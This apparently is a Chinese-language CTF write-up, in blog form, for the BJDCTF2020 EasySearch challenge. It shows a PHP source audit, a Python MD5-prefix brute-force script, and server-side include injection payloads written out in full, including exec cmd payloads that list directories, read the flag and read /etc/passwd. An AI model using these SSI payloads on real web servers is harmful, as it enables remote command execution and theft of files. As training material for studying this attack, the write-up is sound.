@@ -1,0 +1,660 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[BJDCTF2020]EasySearch首先就是dirsearch扫描，用dirsearch的前提一定是前端看不到啥东西了，呢就不用猜，绝对有一些隐藏文件。然后dirsearch就扫描出来了index;php.swp文件。。。然后就看到了源码 进行代码审计  123456789101112131415161718192021222324252627282930313233343536[&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计后的SSI注入漏洞">
+<meta property="og:url" content="http://example.com/2023/04/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%90%8E%E7%9A%84SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="[BJDCTF2020]EasySearch首先就是dirsearch扫描，用dirsearch的前提一定是前端看不到啥东西了，呢就不用猜，绝对有一些隐藏文件。然后dirsearch就扫描出来了index;php.swp文件。。。然后就看到了源码 进行代码审计  123456789101112131415161718192021222324252627282930313233343536[&lt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fd5305ded3ee4678a700f5c927295c54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d81e5269657f4fa8975b3ad0e8c34366.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d688311557fc477c93b7cd7cd86cc4cc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/db28838bdfdf4d0ba8cf31fabf3b381e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/25bd5f4320bc483a8c2fc715f25b1dfc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2b78510fc6914d18924ed0c3f2b9819b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2023-04-20T15:33:27.678Z">
+<meta property="article:modified_time" content="2021-11-19T12:46:32.000Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/fd5305ded3ee4678a700f5c927295c54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+  
+  
+  
+  <title>代码审计后的SSI注入漏洞 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代码审计后的SSI注入漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代码审计后的SSI注入漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>首先就是dirsearch扫描，用dirsearch的前提一定是前端看不到啥东西了，呢就不用猜，绝对有一些隐藏文件。<br>然后dirsearch就扫描出来了index;php.swp文件。。。<br>然后就看到了源码 进行代码审计 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">[<span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>	***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>	***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>代码审计  就是bcusername可以随便写 ，但是 password的前六位必须要md5加密是6d0bc1<br>python爆破 脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000000</span>):<br>    a = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i,a)<br></code></pre></td></tr></table></figure>
+<p>   运行结果<br> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">2020666</span> <span class="hljs-number">6</span>d0bc1153791aa2b4e18b4f344f26ab4<br><span class="hljs-attribute">2305004</span> <span class="hljs-number">6</span>d0bc1ec71a9b814677b85e3ac9c3d40<br><span class="hljs-attribute">9162671</span> <span class="hljs-number">6</span>d0bc11ea877b37d694b38ba8a45b19c<br></code></pre></td></tr></table></figure><br>然后进行登录<br>登录之后，前端认真找找<br><img src="https://img-blog.csdnimg.cn/fd5305ded3ee4678a700f5c927295c54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现一个url here</p>
+<p><strong>知识点：SSI注入漏洞</strong><br>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p>
+<p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
+<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">显示服务器端环境变量&lt;<span class="hljs-meta">#echo&gt;</span><br>本文档名称：<br><br>&lt;!–<span class="hljs-meta">#echo var=<span class="hljs-string">&quot;DOCUMENT_NAME&quot;</span>–&gt;</span><br><br>现在时间：<br><br>&lt;!–<span class="hljs-meta">#echo var=<span class="hljs-string">&quot;DATE_LOCAL&quot;</span>–&gt;</span><br><br>显示IP地址：<br><br>&lt;! <span class="hljs-meta">#echo var=<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>–&gt;</span><br><br>将文本内容直接插入到文档中&lt;<span class="hljs-meta">#<span class="hljs-keyword">include</span>&gt;</span><br><br>&lt;! <span class="hljs-meta">#<span class="hljs-keyword">include</span> file=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;</span><br><br>&lt;!--<span class="hljs-meta">#<span class="hljs-keyword">include</span> virtual=<span class="hljs-string">&quot;index.html&quot;</span> --&gt;</span><br><br>&lt;! <span class="hljs-meta">#<span class="hljs-keyword">include</span> virtual=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;</span><br><br>&lt;!--<span class="hljs-meta">#<span class="hljs-keyword">include</span> virtual=<span class="hljs-string">&quot;/www/footer.html&quot;</span> --&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)<br>文件最近更新日期：<br><br>&lt;! #flastmod <span class="hljs-attribute">file</span>=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;<br><br>文件的长度：<br><br>&lt;!–#fsize <span class="hljs-attribute">file</span>=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;<br><br>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<br><br>&lt;!–#exec <span class="hljs-attribute">cmd</span>=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;<br><br>&lt;!--#exec <span class="hljs-attribute">cmd</span>=<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>--&gt;<br><br>&lt;!–#exec <span class="hljs-attribute">cgi</span>=<span class="hljs-string">&quot;文件名称&quot;</span>–&gt;<br><br>&lt;!--#exec <span class="hljs-attribute">cgi</span>=<span class="hljs-string">&quot;/cgi-bin/access_log.cgi&quot;</span>–&gt;<br><br>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。<br></code></pre></td></tr></table></figure>
+<p>（SSI注入的条件：<br>1.Web 服务器已支持SSI（服务器端包含）</p>
+<p>2.Web 应用程序未对对相关SSI关键字做过滤</p>
+<p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p>
+<p>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">看一下当前目录的文件<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span><br></code></pre></td></tr></table></figure>
+<p>回归本题<br><img src="https://img-blog.csdnimg.cn/d81e5269657f4fa8975b3ad0e8c34366.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>通过</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span><br></code></pre></td></tr></table></figure>
+<p>命令查看回显<br><img src="https://img-blog.csdnimg.cn/d688311557fc477c93b7cd7cd86cc4cc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看到ls的文件目录<br><img src="https://img-blog.csdnimg.cn/db28838bdfdf4d0ba8cf31fabf3b381e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看上一级目录</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/25bd5f4320bc483a8c2fc715f25b1dfc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2b78510fc6914d18924ed0c3f2b9819b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>最后的命令查看flag</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></code></pre></td></tr></table></figure>
+<p>好了好了  累死了 晚上轮滑去<br>妈咦  溜了 你们自学把 </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代码审计后的SSI注入漏洞</div>
+      <div>http://example.com/2023/04/20/代码审计后的SSI注入漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E5%AF%B9Apache%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/" title="对Apache的一些学习">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">对Apache的一些学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E4%BB%8EXML%E5%88%B0XXE/" title="从XML到XXE">
+                        <span class="hidden-mobile">从XML到XXE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
